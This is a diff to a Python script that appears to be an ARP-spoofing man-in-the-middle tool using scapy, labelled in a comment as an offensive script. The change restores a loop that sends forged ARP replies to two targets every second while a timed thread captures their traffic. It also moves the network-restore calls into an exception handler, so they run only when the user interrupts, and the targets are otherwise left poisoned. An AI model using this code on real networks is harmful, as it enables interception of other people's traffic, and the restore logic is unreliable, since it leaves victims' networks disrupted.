@@ -3,7 +3,7 @@
 # TODO: Info that this is an offensive script,
 #  only use in LAN where you allowed to us such SW
 
-# import time
+import time
 import os
 import sys
 import subprocess
@@ -11,7 +11,7 @@ import platform
 import logging
 import click
 
-# from threading import Thread
+from threading import Timer
 from pyfiglet import Figlet
 from printy import printy
 from scapy.all import Ether, ARP, srp, send
@@ -279,28 +279,24 @@ def run(
         os.unlink(TEST_NOT_PASSED_STAMP)
     if os.path.exists(NO_CAPTURE):
         os.unlink(NO_CAPTURE)
-    # # Run capturing in different thread since it's blocking
-    # capture_thread = Thread(target=capture, args=(capture_time))
-    # capture_thread.start()
+    # Run capturing in different thread since it's blocking
+    # Add a few seconds delay in order to spoof before start capturing
+    capture_thread = Timer(interval=3, function=capture, args=[capture_time])
+    capture_thread.start()
 
     # # Send malicious packages every second
-    # try:
-    #     while capture_thread.is_alive():
-    #         # telling the target1 that we are the target2
-    #         spoof(target_ip1, target_ip2)
-    #         # telling the target2 that we are the target1
-    #         spoof(target_ip2, target_ip1)
-
-    #         # sleep for one second
-    #         time.sleep(1)
-    # except KeyboardInterrupt:
-    #     # Restore even the user terminates the process
-    #     pass
     try:
-        spoof(target_ip1, target_ip2)
-        spoof(target_ip2, target_ip1)
-        capture(timeout=capture_time)
-    finally:
+        while capture_thread.is_alive():
+            # telling the target1 that we are the target2
+            spoof(target_ip1, target_ip2)
+            # telling the target2 that we are the target1
+            spoof(target_ip2, target_ip1)
+
+            # sleep for one second
+            time.sleep(1)
+    except KeyboardInterrupt:
+        # Restore even the user terminates the process
+        pass
         # Restore the network to the legit state
         restore(target_ip1, target_ip2)
         restore(target_ip2, target_ip1)
@@ -308,7 +304,7 @@ def run(
         # TODO: Force it to quit? With timeout?
         #  Keep it as it is? Before or after restore?
         # Wait for the sniffing to be completed
-        # capture_thread.join()
+        capture_thread.join()
 
 
 if __name__ == '__main__':
